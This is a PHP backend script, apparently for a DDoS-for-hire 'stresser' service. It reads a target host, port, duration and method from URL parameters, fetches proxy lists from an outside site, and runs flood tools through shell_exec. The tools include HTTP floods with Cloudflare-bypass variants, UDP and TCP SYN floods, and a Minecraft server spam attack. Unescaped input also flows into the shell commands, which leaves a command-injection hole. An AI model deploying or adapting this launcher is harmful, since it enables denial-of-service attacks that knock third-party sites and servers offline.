<?php
error_reporting(0);

/*SETTINGS*/

function get_data($url)
{
	$ch = curl_init();
	$timeout = 5;
	curl_setopt($ch,CURLOPT_URL,$url);
	curl_setopt($ch,CURLOPT_RETURNTRANSFER,1);
	curl_setopt($ch,CURLOPT_CONNECTTIMEOUT,$timeout);
	$data = curl_exec($ch);
	curl_close($ch);
	return $data;
}

$host = htmlspecialchars($_GET["host"]);
$time = intval($_GET["time"]);
$port = intval($_GET["port"]);
$reqtype = htmlspecialchars($_GET["reqtype"]);
$postdata = htmlspecialchars($_GET["postdata"]);
$version = htmlspecialchars($_GET["version"]);
$cookie = htmlspecialchars($_GET["cookie"]);
$method = htmlspecialchars($_GET["method"]);
$type = "HTTP";
$startTime = time();
$size = 100000;
$rq = str_repeat("0",$size);

//Methods//

//Layer 7
$httpstrong = "HTTP-STRONG";
$httpbrust = "HTTP-BRUST";
$httppps = "HTTP-PPS";
$httpfuzz = "HTTP-FUZZ";
$httpnull = "HTTP-NULL";
$httpcookie = "HTTP-COOKIE";
$httpfast = "HTTP-FAST";
$httprand = "HTTP-RAND";
$jsengine = "JS-ENGINE";
$bypass = "BYPASS";
$bypassv2 = "BYPASSv2";
$flood = "FLOOD";
$httprequest = "HTTP-REQUEST";
$httpdrop = "HTTP-DROP";
$httprs = "HTTP-RS";
$browserengine = "BROWSER-ENGINE";
$mcflood = "MC-FLOOD";

//Layer 4
$udp = "UDP";
$udpbypass = "L4-BYPASS";
$udprand = "UDP-RAND";
$tcp = "TCP";
$syn = "SYN";
$dns = "DNS";

//Methods//

$stop = "STOP";

$httpProxyMethods = array($mcflood, $httpstrong, $httpbrust, $httppps, $httpfuzz, $httpnull, $httpcookie, $httpfast, $httprand, $jsengine, $bypass, $bypassv2, $browserengine);
$socks5ProxyMethods = array($httprs);

$methods = array($mcflood, $browserengine, $httprs, $httpdrop, $httprequest, $flood, $bypass, $bypassv2, $httpstrong, $httpbrust, $httppps, $httpfuzz, $httpnull, $httpcookie, $httpfast, $httprand, $jsengine, $udp, $udpbypass, $udprand, $tcp, $syn, $dns, $stop);

//Directory Names
$layer7dir = "layer7";
$layer4dir = "layer4";
$minecraftdir = "minecraft";

$parsedHost = parse_url($host, PHP_URL_HOST);
$parsedHostPath = parse_url($host, PHP_URL_PATH);

if($parsedHostPath == "")
	$parsedHostPath = "/";

if($parsedHost)
{
	$protocol = parse_url($host, PHP_URL_SCHEME);
	echo $protocol;
	if($protocol == "https")
		$port = 443;
	else
		$port = 80;
}

/*SETTINGS*/


if(isset($method) && $method == $stop)
{
	if ($parsedHost)
	{
		$durdur = shell_exec("screen -ls | awk -vFS='\t|[.]' '/$parsedHost/ {system(\"screen -S \"$2\" -X quit\")}'"); //Örn: 3 tane aynı yere attack açık, hepsini kapatır ve öldürür.
		echo $durdur;
	}
	else
	{
		$durdur = shell_exec("screen -ls | awk -vFS='\t|[.]' '/$host/ {system(\"screen -S \"$2\" -X quit\")}'"); //Örn: 3 tane aynı yere attack açık, hepsini kapatır ve öldürür.
		echo $durdur;
	}
}
else
{
	if(!isset($host))die("Host is not defined!");
	if(!isset($time))die("Time is not defined!");
	if(!isset($port))die("Port is not defined!");
	if($parsedHost)
		if(!isset($reqtype))die("Request Type is not defined!");
	/*if($parsedHost)
		if(!isset($cookie))die("Cookie is not defined!");  OPTIONAL! */
	/*if($parsedHost)
		if(!isset($postdata))die("POST Data is not defined!");  OPTIONAL! */
	if(!isset($method))die("Method is not defined!");

	if (in_array($method, $httpProxyMethods))
		$type = "HTTP";
	else if(in_array($method, $socks5ProxyMethods))
		$type = "SOCKS5";
	else
		$type = "HTTP";
	$proxiesLocation = "https://realstresser.com/ajax/proxies?type=$type";
	if($type == "SOCKS5")
	{
		$proxies = file_get_contents($proxiesLocation);
		$proxyFile = fopen("socks5.txt", "w") or die("An error has been occurred on creating proxy file!");
		fwrite($proxyFile, $proxies);
		fclose($proxyFile);	
	}
	else
	{
		$proxies = file_get_contents($proxiesLocation);
		$proxyFile = fopen("proxy.txt", "w") or die("An error has been occurred on creating proxy file!");
		fwrite($proxyFile, $proxies);
		fclose($proxyFile);	
	}
}

if (!in_array($method, $methods)) die("Invalid attack method");

/* ---------------------------------------------------------------------------------------------------------------------------------------------------- */
/* LAYER 7 */
/* ---------------------------------------------------------------------------------------------------------------------------------------------------- */

/* HTTP-STRONG */
if(isset($method) && $method == $httpstrong) { $command = "screen -dmS $parsedHost node $layer7dir/http.js $host proxy.txt ua.txt $time $reqtype"; }

/* HTTP-BRUST */
if(isset($method) && $method == $httpbrust) { $command = "screen -dmS $parsedHost node $layer7dir/httpbrust.js $host proxy.txt $time $reqtype ua.txt"; }

/* HTTP-PPS */
if(isset($method) && $method == $httppps) { $command = "screen -dmS $parsedHost node $layer7dir/httppps.js $host proxy.txt $time $reqtype"; }

/* HTTP-FUZZ */
if(isset($method) && $method == $httpfuzz) { $command = "screen -dmS $parsedHost node $layer7dir/httpfuzz.js $host proxy.txt $time $reqtype"; }

/* HTTP-NULL */
if(isset($method) && $method == $httpnull) { $command = "screen -dmS $parsedHost node $layer7dir/httpnull.js $host proxy.txt $time"; }

/* HTTP-COOKIE */
if(isset($method) && $method == $httpcookie) { $command = "screen -dmS $parsedHost node $layer7dir/httpcookie.js $host proxy.txt $time $reqtype"; }

/* HTTP-FAST */
if(isset($method) && $method == $httpfast) { $command = "screen -dmS $parsedHost ./$layer7dir/slavic -h $host -p proxy.txt -t $time -m $reqtype"; }

/* HTTP-RAND */
if(isset($method) && $method == $httprand) { $command = "screen -dmS $parsedHost node $layer7dir/http.js $host proxy.txt $time $reqtype"; }

/* JS-ENGINE */
if(isset($method) && $method == $jsengine) { $command = "screen -dmS $parsedHost node $layer7dir/JS-Engine.js $host $time 7 proxy.txt $reqtype"; }

/* BYPASS */
if(isset($method) && $method == $bypass) { $command = "screen -dmS $parsedHost ./$layer7dir/cf -h $host -p proxy.txt -t $time -m $reqtype"; }

/* BYPASS v2 */
if(isset($method) && $method == $bypassv2) { $command = "screen -dmS $parsedHost node ./$layer7dir/BypassV2/method.js $host $time request 1 proxy.txt ua.txt"; }

/* FLOOD */
if(isset($method) && $method == $flood) { $command = "screen -dmS $parsedHost node $layer7dir/FLOOD.js $host $time HTTP/1.1 $reqtype"; }

/* HTTP-REQUEST */
if(isset($method) && $method == $httprequest) { $command = "screen -dmS $parsedHost node $layer7dir/HTTP-REQUEST.js $host $time ua.txt 50"; }

/* HTTP-DROP */
if(isset($method) && $method == $httpdrop) { $command = "screen -dmS $parsedHost node $layer7dir/HTTP-REQUEST.js $host $time ua.txt 9999"; }

/* HTTP-RS */
if(isset($method) && $method == $httprs) { $command = "screen -dmS $parsedHost python3 $layer7dir/cc.py $parsedHost $port cc $parsedHostPath 800 $time socks5.txt $reqtype"; }

/* BROWSER-ENGINE */
if(isset($method) && $method == $browserengine) { $command = "screen -dmS $parsedHost node $layer7dir/BROWSER-ENGINE.js \"$host\" $time ua.txt 300 $reqtype proxy.txt referer.txt"; }

/* ---------------------------------------------------------------------------------------------------------------------------------------------------- */
/* LAYER 4 */
/* ---------------------------------------------------------------------------------------------------------------------------------------------------- */

/* UDP */
if(isset($method) && $method == $udp) { $command = "screen -dmS $host perl $layer4dir/udp.pl $host $port 0 $time"; }

/* L4-BYPASS */
if(isset($method) && $method == $udpbypass) { $command = "screen -dmS $host ./$layer4dir/udpbypass $host $port 2000 $time"; }

/* UDP-RAND */
if(isset($method) && $method == $udprand) { $command = "screen -dmS $host perl $layer4dir/UDP-RAND.pl $host $time"; }

/* TCP - SYN */
if(isset($method) && $method == $syn) { $command = "screen -dmS $host perl $layer4dir/tcpsyn.pl $host $port 1024 $time"; }

/* Modem S2en (Wireless Attack) */
if(isset($method) && $method == $dns) { $command = "screen -dmS $host ./$layer4dir/modemsiken $host $port"; }

/* ---------------------------------------------------------------------------------------------------------------------------------------------------- */
/* MINECRAFT */
/* ---------------------------------------------------------------------------------------------------------------------------------------------------- */

/* MC-FLOOD */
if(isset($method) && $method == $mcflood) { $command = "screen -dmS $host node $minecraftdir/MinecraftSpam.js --host $host --port $port --username true --time $time --speed 60 --proxy proxy.txt"; }

/* ---------------------------------------------------------------------------------------------------------------------------------------------------- */
/* ---------------------------------------------------------------------------------------------------------------------------------------------------- */
/* ---------------------------------------------------------------------------------------------------------------------------------------------------- */

if($method != $stop) {
	if($parsedHost)
		echo "Attack launched $parsedHost for $time seconds. [$method]";
	else
		echo "Attack launched $host for $time seconds. [$method]";
}

shell_exec($command);

/* ---------------------------------------------------------------------------------------------------------------------------------------------------- */
/* ---------------------------------------------------------------------------------------------------------------------------------------------------- */
/* ---------------------------------------------------------------------------------------------------------------------------------------------------- */

?>